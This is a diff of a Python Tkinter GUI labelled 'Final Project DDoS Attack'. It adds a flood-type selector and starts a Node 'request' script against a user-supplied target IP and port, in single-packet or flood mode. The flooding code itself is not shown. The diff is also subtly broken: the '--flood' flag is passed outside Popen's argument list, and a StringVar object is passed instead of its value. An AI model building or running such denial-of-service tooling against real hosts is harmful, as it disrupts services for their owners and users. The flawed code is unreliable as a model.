@@ -13,6 +13,7 @@ import time
 '''
 root = Tk()
 var = IntVar()
+varFlood = IntVar()
 IP_text = StringVar()
 Port_text = StringVar()
 ht_text = StringVar(root, '/index.html')
@@ -22,6 +23,7 @@ FileDownload_text = StringVar(root,'/')
     create the GUI of attacker
 '''
 var.set(1)
+varFlood.set(1)
 #size windows
 root.geometry("620x413+0+0")
 root.title("Final Project DDoS Attack")
@@ -38,15 +40,19 @@ label_IP = Label(root, text="IP Dest:", bg="black", fg="#fecc15", font="Ariel 10
 label_Port = Label(root, text="Port:",bg="black", fg="#fecc15", font="Ariel 10 bold")
 label_ht = Label(root, text="requested file:",bg="black", fg="#fecc15", font="Ariel 10 bold")
 label_FileDownload = Label(root, text="file:", bg="black", fg="#fecc15", font="Ariel 10 bold")
+label_NumPack = Label(root, text="Number Packets:",bg="black", fg="#fecc15", font="Ariel 10 bold")
+label_Type_Flood = Label(root, text="Type Flood:", bg="black", fg="#fecc15", font="Ariel 10 bold")
 Entry_IP = Entry(root, textvariable=IP_text)
 Entry_Port = Entry(root, textvariable=Port_text)
 Entry_ht = Entry(root, textvariable=ht_text)
 Entry_FileDownload = Entry(root, textvariable=FileDownload_text)
 label_MAIN.place(x=210,y=50)
-label_IP.place(x=120,y=100)
-label_Port.place(x=120,y=120)
-label_ht.place(x=120,y=140)
-label_FileDownload.place(x=120,y=160)
+label_IP.place(x=110,y=100)
+label_Port.place(x=110,y=120)
+label_ht.place(x=110,y=140)
+label_FileDownload.place(x=110,y=160)
+label_NumPack.place(x=110, y=200)
+label_Type_Flood.place(x=110, y=265)
 Entry_IP.place(x=240,y=100)
 Entry_Port.place(x=240,y=120)
 Entry_ht.place(x=240,y=140)
@@ -65,6 +71,35 @@ class tick():
         self.label.configure(text=now)
         root.after(1000, self.update_clock)
 tick()
+
+# options to add Flood types
+TYPEFLOODS = [
+    ("Single packet", 1),
+    ("Flood", 2),
+]
+
+vFlood = StringVar()
+vFlood.set("L")
+# initialize options
+i=0
+
+bFlood=[0]*2
+def chooseFlood():
+    for i in range(2):
+        bFlood[i].configure(background="black")
+    selection = varFlood.get()
+    if (selection == 1):
+        bFlood[0].configure(background="blue")
+    elif (selection == 2):
+        bFlood[1].configure(background="blue")
+
+for text, mode in TYPEFLOODS:
+    bFlood[i] = Radiobutton(root, text=text,indicatoron = 1,width = 10,padx=10,variable=varFlood , bg="black", fg="#fecc15", font="Ariel 10 bold", value=mode, command=chooseFlood)
+    bFlood[i].place(x=250, y=200 +(i*25))
+    i=i+1
+    #print (mode)
+bFlood[0].configure(background="blue")
+
 # options to add attack types
 MODES = [
     ("Traffic Flood", 1),
@@ -84,7 +119,7 @@ def chooseAttack():
 
 for text, mode in MODES:
     b[i] = Radiobutton(root, text=text,indicatoron = 1,width = 10,padx=10,variable=var , bg="black", fg="#fecc15", font="Ariel 10 bold", value=mode, command=chooseAttack)
-    b[i].place(x=250, y=200+(i*25))
+    b[i].place(x=250, y=265+(i*25))
     i=i+1
     #print (mode)
 b[0].configure(background="blue")
@@ -155,8 +190,12 @@ def toggle_text():
     if button_start["text"] == "START":
         if not checkMsg():
             return;
-        selection = var.get()
-        nodeAttack = subprocess.Popen(["node","request","-t",str(IP_text.get()),"-p",str(Port_text.get()),"-ht",str(ht_text.get()),"-f",str(FileDownload_text)])
+        selection = varFlood.get()
+        if (selection ==1):
+            nodeAttack = subprocess.Popen(["node","request","-t",str(IP_text.get()),"-p",str(Port_text.get()),"-ht",str(ht_text.get()),"-f",str(FileDownload_text)])
+        else:
+            nodeAttack = subprocess.Popen(["node", "request", "-t", str(IP_text.get()), "-p", str(Port_text.get()), "-ht", str(ht_text.get()),"-f", str(FileDownload_text)],"--flood")
+
         button_start["text"] = "STOP"
         texti = 'stop'
         ToolBar()
@@ -171,7 +210,7 @@ def toggle_text():
             ToolBar()
 
 button_start = Button(root, text="START", bg="black", fg="#fecc15", font="Ariel 10 bold", command=toggle_text)
-button_start.place(x=280,y=270)
+button_start.place(x=280,y=300)
 
 '''
     Define toolbar on GUI
@@ -217,7 +256,7 @@ class ToolBar(Frame):
         except:
             t = Toplevel(self)
             t.wm_title("README")
-            file = open("howtouse.txt", "r")
+            file = open("README.md", "r")
             i=1
             for line in file:
                 l = Label(t, text=line)
